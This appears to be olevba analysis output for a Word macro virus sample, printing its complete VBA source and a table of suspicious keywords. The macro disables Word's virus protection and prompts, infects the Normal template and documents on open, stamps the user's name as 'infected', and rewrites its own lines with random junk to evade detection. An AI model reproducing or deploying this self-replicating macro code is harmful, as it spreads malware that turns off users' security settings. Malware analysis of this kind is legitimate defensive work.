olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.CPCK-based-ce12c8b69c57a51bb5afe01afcea1b433760e8dc
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.CPCK-based-ce12c8b69c57a51bb5afe01afcea1b433760e8dc - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub Document_Open()

On Error Resume Next

Application.EnableCancelKey = 0

Options.VirusProtection = 0

ME84 = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines

Options.SaveNormalPrompt = 0

Options.ConfirmConversions = 0

GJ13 = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines

If Left(ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Sub" Then

Set NQ17 = ActiveDocument.VBProject.VBComponents.Item(1)

UF19 = True

End If

If Left(NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Sub" Then

Set NQ17 = NormalTemplate.VBProject.VBComponents.Item(1)

ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.InsertLines ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines, "' ****** " & Application.UserName & " was infected " & Now & vbCr

ME84 = ME84 + 2

PH37 = True

End If

If PH37 <> True And UF19 <> True Then GoTo OU29

If PH37 = True Then NQ17.CodeModule.AddFromString ("Sub Document_Close()" & vbCr & ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(2, ME84 - 1))

If UF19 = True Then NQ17.CodeModule.AddFromString ("Sub Document_Open()" & vbCr & NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(2, GJ13 - 1))

With NQ17.CodeModule

For x = 2 To (NQ17.CodeModule.CountOfLines - 1) Step 2

For y = 1 To (Int(Rnd * 10) + 2)

CI33 = CI33 + (Chr(65 + Int(Rnd * 22))) & (Chr(122 - Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & (Chr(122 - Int(Rnd * 22))) & " + "

Next y

.replaceline x, (Chr(65 + Int(Rnd * 22))) & " = " & CI33 & (Chr(65 + Int(Rnd * 22)))

CI33 = ""

Next x

End With

OU29:

If GJ13 <> 0 And ME84 = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName

End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

